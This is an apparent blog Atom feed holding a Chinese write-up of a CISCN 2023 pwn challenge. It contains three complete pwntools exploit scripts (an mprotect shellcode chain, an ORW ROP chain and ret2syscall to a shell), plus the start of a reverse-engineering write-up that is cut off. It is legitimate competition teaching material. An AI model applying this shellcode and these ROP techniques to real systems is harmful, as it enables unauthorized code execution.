<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>4ss1du0us&#39;s Blog</title>
  
  <subtitle>Welcome</subtitle>
  <link href="https://www.4ss1du0us.cn/atom.xml" rel="self"/>
  
  <link href="https://www.4ss1du0us.cn/"/>
  <updated>2023-07-01T03:08:43.053Z</updated>
  <id>https://www.4ss1du0us.cn/</id>
  
  <author>
    <name>4ss1du0us</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>【CISCN 2023】烧烤摊儿</title>
    <link href="https://www.4ss1du0us.cn/2023/06de7311e3.html"/>
    <id>https://www.4ss1du0us.cn/2023/06de7311e3.html</id>
    <published>2023-06-11T02:52:37.000Z</published>
    <updated>2023-07-01T03:08:43.053Z</updated>
    
    <content type="html"><![CDATA[<h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><ul><li><p><mark>通过 <code>scanf()</code> 输入的数据可以作为溢出点</mark></p></li><li><p><mark>使用 <code>ret2shellcode（mprotect 修改权限）</code>、<code>ORW</code>、<code>ret2syscall</code> 三种方法 get shell</mark></p></li></ul><hr><p><a href="https://ctf.ichunqiu.com/2023ciscn">（2023年5月27日-2023年5月28日）【CISCN 2023】烧烤摊儿</a></p><hr><h2 id="思路一"><a href="#思路一" class="headerlink" title="思路一"></a>思路一</h2><ol><li><p>分析程序：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/CISCN2023-%E7%83%A7%E7%83%A4%E6%91%8A%E5%84%BF1.png" alt="CISCN2023-烧烤摊儿1.png"><br>开启了金丝雀和栈不可执行</p></li><li><p>根据程序运行时的输出，在 IDA 下分析：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/CISCN2023-%E7%83%A7%E7%83%A4%E6%91%8A%E5%84%BF2.png" alt="CISCN2023-烧烤摊儿2.png"><br>其中，目录 <code>menu()</code> 的输出为：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/CISCN2023-%E7%83%A7%E7%83%A4%E6%91%8A%E5%84%BF3.png" alt="CISCN2023-烧烤摊儿3.png"><br>查看各个目录项的功能<br>① <code>pijiu()</code><br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/CISCN2023-%E7%83%A7%E7%83%A4%E6%91%8A%E5%84%BF4.png" alt="CISCN2023-烧烤摊儿4.png"><br>② <code>chuan()</code><br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/CISCN2023-%E7%83%A7%E7%83%A4%E6%91%8A%E5%84%BF5.png" alt="CISCN2023-烧烤摊儿5.png"><br>③ <code>yue()</code><br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/CISCN2023-%E7%83%A7%E7%83%A4%E6%91%8A%E5%84%BF6.png" alt="CISCN2023-烧烤摊儿6.png"><br>④ <code>vip()</code><br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/CISCN2023-%E7%83%A7%E7%83%A4%E6%91%8A%E5%84%BF7.png" alt="CISCN2023-烧烤摊儿7.png"><br>⑤ <code>gaiming()</code><br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/CISCN2023-%E7%83%A7%E7%83%A4%E6%91%8A%E5%84%BF8.png" alt="CISCN2023-烧烤摊儿8.png"></p></li><li><p>发现在 <code>gaiming()</code> 函数中，有将用户的输入 <code>v5</code> 赋值给全局变量 <code>name</code> 的操作<br>同时没有对 <code>v5</code> 的长度进行限制，存在栈溢出漏洞<br>需覆盖 0x28 个数据到达返回地址处：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/CISCN2023-%E7%83%A7%E7%83%A4%E6%91%8A%E5%84%BF15.png" alt="CISCN2023-烧烤摊儿15.png"><br>跟进发现全局变量 <code>name</code> 在 .data 段上：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/CISCN2023-%E7%83%A7%E7%83%A4%E6%91%8A%E5%84%BF9.png" alt="CISCN2023-烧烤摊儿9.png"><br>于是考虑将 shellcode 写到这里<br>用 gdb 查看权限：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/CISCN2023-%E7%83%A7%E7%83%A4%E6%91%8A%E5%84%BF10.png" alt="CISCN2023-烧烤摊儿10.png"><br>全局变量 <code>name</code> 的地址 <code>0x4E60F0</code> 在 <code>0x4e6000 ~ 0x4e9000</code> 之间，Perm 为 <code>rw-p</code> 没有执行权限<br>但考虑到程序中有 <code>mprotect()</code> 函数：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/CISCN2023-%E7%83%A7%E7%83%A4%E6%91%8A%E5%84%BF11.png" alt="CISCN2023-烧烤摊儿11.png"><br>可以用 <code>mprotect()</code> 函数为该段地址增加执行权限<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/CISCN2023-%E7%83%A7%E7%83%A4%E6%91%8A%E5%84%BF12.png" alt="CISCN2023-烧烤摊儿12.png"><br><code>mprotect()</code> 函数的起始地址为 <code>0x458b00</code></p></li><li><p>使用 <code>ROPgadget --binary shaokao --only &#39;pop|ret&#39; | grep &#39;pop&#39;</code> 搜索可利用的 ROP：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/CISCN2023-%E7%83%A7%E7%83%A4%E6%91%8A%E5%84%BF13.png" alt="CISCN2023-烧烤摊儿13.png"><br><code>mprotect()</code> 需要三个参数，分别是：<br>① RDI：要修改的内存页首地址（我这里将 <code>0x4e6000 ~ 0x4e9000</code> 这段地址全部改为 rwx 权限）<br>② RSI：要修改的内存页大小（我这里段长度为 0x3000）<br>③ RDX：要修改的权限（其中 r : 4，w : 2，x : 1，因此 rwx 为 4 + 2 + 1 &#x3D; 7）<br>同时，获取返回地址 <code>ret</code> 的地址：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/CISCN2023-%E7%83%A7%E7%83%A4%E6%91%8A%E5%84%BF14.png" alt="CISCN2023-烧烤摊儿14.png"></p></li><li><p>经过分析可知，要想执行 <code>gaiming()</code> 中的栈溢出漏洞，首先要让 <code>own = 1</code>，只有在 <code>vip()</code> 中可以修改 <code>own</code> 的值为 1<br>首先需要买下摊位，要求余额 <code>money &gt; 100000</code>，而 <code>money</code> 的初始值为 233<br>发现在购买逻辑中存在漏洞：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/CISCN2023-%E7%83%A7%E7%83%A4%E6%91%8A%E5%84%BF17.png" alt="CISCN2023-烧烤摊儿17.png"><br>当 <code>v9</code> 为负数时，可以让 <code>money</code> 增长，超过 100000 即可</p></li><li><p>因此，思路如下：<br>① 首先通过购买的逻辑漏洞使余额 <code>money &gt; 100000</code>，买下摊位，进入 <code>gaiming()</code> 函数<br>② 然后利用 <code>mprotect()</code> 函数给 <code>name</code> 所在的 .data 段增加执行权限<br>③ 最后通过 <code>j_strcpy_ifunc(&amp;name, v5)</code> 向 <code>name</code> 中写入 shellcode，并溢出 <code>v5</code> 执行 shellcode</p></li></ol><hr><h2 id="脚本一"><a href="#脚本一" class="headerlink" title="脚本一"></a>脚本一</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>  <span class="token comment"># 打印调试信息</span>content <span class="token operator">=</span> <span class="token number">1</span>  <span class="token comment"># 本地Pwn通之后，将content改成0，Pwn远程端口</span><span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>    io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"/home/wyy/桌面/PWN/shaokao"</span><span class="token punctuation">)</span>  <span class="token comment"># 程序在kali的路径</span><span class="token keyword">else</span><span class="token punctuation">:</span>    io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"39.107.137.13"</span><span class="token punctuation">,</span> <span class="token number">20341</span><span class="token punctuation">)</span>  <span class="token comment"># 题目的远程端口</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/home/wyy/桌面/PWN/shaokao"</span><span class="token punctuation">)</span>name_addr <span class="token operator">=</span> <span class="token number">0x4E60F0</span>pop_rdi_addr <span class="token operator">=</span> <span class="token number">0x40264f</span>pop_rsi_addr <span class="token operator">=</span> <span class="token number">0x40a67e</span>pop_rdx_rbx_addr <span class="token operator">=</span> <span class="token number">0x4a404b</span>ret_addr <span class="token operator">=</span> <span class="token number">0x40101a</span>mprotect_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'mprotect'</span><span class="token punctuation">]</span>  <span class="token comment"># 0x458b00</span>main_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'main'</span><span class="token punctuation">]</span>  <span class="token comment"># 0x401B45</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"-100000000"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"4"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"5"</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x28</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x4E6000</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rsi_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x3000</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdx_rbx_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x7</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>  <span class="token comment"># 布置mprotect()函数的参数</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>mprotect_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ret_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>main_addr<span class="token punctuation">)</span>  <span class="token comment"># 跳转到mprotect()函数后返回到main()函数</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"-100000000"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"4"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"5"</span><span class="token punctuation">)</span>shellcode <span class="token operator">=</span> <span class="token string">b'\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05'</span>payload <span class="token operator">=</span> shellcode<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>  <span class="token comment"># 补齐0x28个填充数据到达返回地址处</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>name_addr<span class="token punctuation">)</span>  <span class="token comment"># 跳转到shellcode处执行</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="结果一"><a href="#结果一" class="headerlink" title="结果一"></a>结果一</h2><p><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/CISCN2023-%E7%83%A7%E7%83%A4%E6%91%8A%E5%84%BF16.png" alt="CISCN2023-烧烤摊儿16.png"></p><hr><h2 id="思路二"><a href="#思路二" class="headerlink" title="思路二"></a>思路二</h2><ol><li><p>在思路一中买下摊位执行  <code>gaiming()</code> 函数后<br>由于程序中包含 <code>open64()</code>、<code>read()</code>、<code>write()</code> 函数<br>因此还可以利用 <code>v5</code> 的溢出使用 ORW 读出 flag</p></li><li><p>确定 ORW 三个函数的地址：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/CISCN2023-%E7%83%A7%E7%83%A4%E6%91%8A%E5%84%BF18.png" alt="CISCN2023-烧烤摊儿18.png"><br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/CISCN2023-%E7%83%A7%E7%83%A4%E6%91%8A%E5%84%BF19.png" alt="CISCN2023-烧烤摊儿19.png"><br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/CISCN2023-%E7%83%A7%E7%83%A4%E6%91%8A%E5%84%BF20.png" alt="CISCN2023-烧烤摊儿20.png"><br><code>open64()</code> 地址：<code>0x457C90</code><br><code>read()</code> 地址：<code>0x457DC0</code><br><code>write()</code> 地址：<code>0x457E60</code></p></li><li><p>首先需要通过 <code>j_strcpy_ifunc(&amp;name, v5)</code> 向 <code>name</code> 中写入 <code>b&#39;./flag\x00\x00&#39;</code>，并将 <code>b&#39;./flag\x00\x00&#39;</code> 作为 <code>open64()</code> 函数的参数，构造 <code>open(b&#39;./flag\x00\x00&#39;, 0)</code> 用于打开当前目录下名为 flag 的文件，其中 0 表示只读方式打开</p></li><li><p>然后构造 <code>read(3, name_addr, 0x50)</code> 将 flag 内容写入到 <code>name</code> 的地址处，再通过构造 <code>write(1, name_addr, 0x50)</code> 将 flag 内容从 <code>name</code> 的地址处输出到终端</p></li></ol><hr><h2 id="脚本二"><a href="#脚本二" class="headerlink" title="脚本二"></a>脚本二</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>  <span class="token comment"># 打印调试信息</span>content <span class="token operator">=</span> <span class="token number">1</span>  <span class="token comment"># 本地Pwn通之后，将content改成0，Pwn远程端口</span><span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>    io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"/home/wyy/桌面/PWN/shaokao"</span><span class="token punctuation">)</span>  <span class="token comment"># 程序在kali的路径</span><span class="token keyword">else</span><span class="token punctuation">:</span>    io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"39.107.137.13"</span><span class="token punctuation">,</span> <span class="token number">20341</span><span class="token punctuation">)</span>  <span class="token comment"># 题目的远程端口</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/home/wyy/桌面/PWN/shaokao"</span><span class="token punctuation">)</span>open64_addr <span class="token operator">=</span> <span class="token number">0x457C90</span>read_addr <span class="token operator">=</span> <span class="token number">0x457DC0</span>write_addr <span class="token operator">=</span> <span class="token number">0x457E60</span>name_addr <span class="token operator">=</span> <span class="token number">0x4E60F0</span>pop_rdi_addr <span class="token operator">=</span> <span class="token number">0x40264f</span>pop_rsi_addr <span class="token operator">=</span> <span class="token number">0x40a67e</span>pop_rdx_rbx_addr <span class="token operator">=</span> <span class="token number">0x4a404b</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"-100000000"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"4"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"5"</span><span class="token punctuation">)</span><span class="token comment"># open(b'./flag\x00\x00', 0)</span>ORW <span class="token operator">=</span> p64<span class="token punctuation">(</span>pop_rdi_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>name_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rsi_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>open64_addr<span class="token punctuation">)</span><span class="token comment"># read(3, name_addr, 0x50)</span>ORW <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rsi_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>name_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdx_rbx_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x50</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>read_addr<span class="token punctuation">)</span><span class="token comment"># write(1, name_addr, 0x50)</span>ORW <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rsi_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>name_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdx_rbx_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x50</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>write_addr<span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">b'./flag\x00\x00'</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>  <span class="token comment"># 向 name_addr 处填入b'./flag\x00\x00' 并补齐 8 字节，将长度填充到 0x28 至返回地址处</span>payload <span class="token operator">+=</span> ORWio<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="结果二"><a href="#结果二" class="headerlink" title="结果二"></a>结果二</h2><p><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/CISCN2023-%E7%83%A7%E7%83%A4%E6%91%8A%E5%84%BF21.png" alt="CISCN2023-烧烤摊儿21.png"></p><hr><h2 id="思路三"><a href="#思路三" class="headerlink" title="思路三"></a>思路三</h2><ol><li><p>在思路一中买下摊位执行  <code>gaiming()</code> 函数后<br>由于程序没有给出 libc 文件，并且可以向 <code>name</code> 所在的 <code>.data</code> 段写入数据<br>因此可以考虑向 <code>.data</code> 段上写入 <code>&quot;/bin/sh&quot;</code><br>但程序中没有 <code>system()</code> 函数，可以考虑使用 ret2syscall 构造 <code>execve(&quot;/bin/sh&quot;, NULL, NULL)</code> 来 get shell</p></li><li><p>首先确定程序中存在 <code>pop rax ; ret</code><br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/CISCN2023-%E7%83%A7%E7%83%A4%E6%91%8A%E5%84%BF22.png" alt="CISCN2023-烧烤摊儿22.png"><br>还要存在 <code>syscall</code><br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/CISCN2023-%E7%83%A7%E7%83%A4%E6%91%8A%E5%84%BF23.png" alt="CISCN2023-烧烤摊儿23.png"></p></li><li><p>首先需要通过 <code>j_strcpy_ifunc(&amp;name, v5)</code> 向 <code>name</code> 中写入 <code>b&#39;/bin/sh\x00&#39;</code>，并溢出 <code>v5</code> 构造 <code>execve(&quot;/bin/sh&quot;, NULL, NULL)</code> 执行</p></li><li><p>注意这里是将 <code>b&#39;/bin/sh\x00&#39;</code> 写入到 <code>name</code>，所以只能一次性 get shell<br>如果分两次的话，例如：第一次写入 <code>b&#39;/bin/sh\x00&#39;</code>，第二次执行 <code>execve(&quot;/bin/sh&quot;, NULL, NULL)</code>，则在第二次中执行 <code>j_strcpy_ifunc(&amp;name, v5)</code> 又会将 <code>name</code> 覆盖掉，导致 get shell 失败</p></li></ol><hr><h2 id="脚本三"><a href="#脚本三" class="headerlink" title="脚本三"></a>脚本三</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>  <span class="token comment"># 打印调试信息</span>content <span class="token operator">=</span> <span class="token number">1</span>  <span class="token comment"># 本地Pwn通之后，将content改成0，Pwn远程端口</span><span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>    io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"/home/wyy/桌面/PWN/shaokao"</span><span class="token punctuation">)</span>  <span class="token comment"># 程序在kali的路径</span><span class="token keyword">else</span><span class="token punctuation">:</span>    io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"39.107.137.13"</span><span class="token punctuation">,</span> <span class="token number">20341</span><span class="token punctuation">)</span>  <span class="token comment"># 题目的远程端口</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/home/wyy/桌面/PWN/shaokao"</span><span class="token punctuation">)</span>name_addr <span class="token operator">=</span> <span class="token number">0x4E60F0</span>pop_rdi_addr <span class="token operator">=</span> <span class="token number">0x40264f</span>pop_rsi_addr <span class="token operator">=</span> <span class="token number">0x40a67e</span>pop_rdx_rbx_addr <span class="token operator">=</span> <span class="token number">0x4a404b</span>pop_rax_addr <span class="token operator">=</span> <span class="token number">0x458827</span>syscall_addr <span class="token operator">=</span> <span class="token number">0x402404</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"-100000000"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"4"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"5"</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">b'/bin/sh\x00'</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rax_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x3b</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>name_addr<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rsi_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdx_rbx_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>syscall_addr<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="结果三"><a href="#结果三" class="headerlink" title="结果三"></a>结果三</h2><p><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/CISCN2023-%E7%83%A7%E7%83%A4%E6%91%8A%E5%84%BF24.png" alt="CISCN2023-烧烤摊儿24.png"></p>]]></content>
    
    
    <summary type="html">第十六届 CISCN 国赛初赛的一道题，难度不算大，主要是利用 scanf 输入的溢出来 get shell，方法很多，赛后根据这道题总结了三种方法：ret2shellcode（mprotect 修改权限）、ORW、ret2syscall</summary>
    
    
    
    <category term="二进制漏洞利用" scheme="https://www.4ss1du0us.cn/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
    
    <category term="CTF刷题" scheme="https://www.4ss1du0us.cn/tags/CTF%E5%88%B7%E9%A2%98/"/>
    
    <category term="PWN" scheme="https://www.4ss1du0us.cn/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>【ISCC 2023】Pull the Wool Over People&#39;s Eyes</title>
    <link href="https://www.4ss1du0us.cn/2023/069f2898f.html"/>
    <id>https://www.4ss1du0us.cn/2023/069f2898f.html</id>
    <published>2023-06-09T07:29:24.000Z</published>
    <updated>2023-06-29T10:47:54.630Z</updated>
    
    <content type="html"><![CDATA[<h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><ul><li><p>使用 OllyDBG 动态调试直接获取程序的中间数据</p></li><li><p>分析伪代码函数逻辑</p></li></ul><hr><p><a href="https://iscc.isclab.org.cn/">（2023年5月1日-2023年5月25日）【ISCC 2023】Pull the Wool Over People’s Eyes</a></p><hr><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol><li><p>定位到主函数：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/ISCC2023-Pull%20the%20Wool%20Over%20People's%20Eyes1.png" alt="ISCC2023-Pull the Wool Over People&#39;s Eyes1.png"><br>代码比较长，先定位到输入的位置<br><code>sub_402190(std::cin, v35)</code> 让用户输入 <code>v35</code><br><code>sub_401650(Src, v22, v25)</code> 用于生成一个 <code>Src</code>，后面会用到<br>生成 <code>Src</code> 的逻辑如下：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/ISCC2023-Pull%20the%20Wool%20Over%20People's%20Eyes2.png" alt="ISCC2023-Pull the Wool Over People&#39;s Eyes2.png"></p></li><li><p>虽然给出了生成 <code>Src</code> 的代码，但是这里可以通过 OllyDBG 动态调试直接得到 <code>Src</code> 的内容，在 <code>sub_401650()</code> 函数的返回值处，下一个断点即可<br>先找到 <code>return Src;</code> 这句的地址，在这一条指令处使用快捷键 <code>TAB</code>：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/ISCC2023-Pull%20the%20Wool%20Over%20People's%20Eyes3.png" alt="ISCC2023-Pull the Wool Over 